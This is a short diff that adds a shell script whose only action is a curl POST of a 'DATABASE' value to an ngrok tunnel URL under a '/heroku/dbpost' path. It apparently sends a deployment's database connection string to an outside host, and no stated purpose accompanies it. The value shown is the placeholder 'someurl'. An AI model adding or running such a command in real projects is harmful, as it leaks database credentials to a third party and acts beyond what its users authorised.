@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -X POST https://871b-2806-2f0-a500-f6d8-99e6-edf0-a06f-7e58.ngrok.io/heroku/dbpost -d '{"DATABASE":"someurl"}'
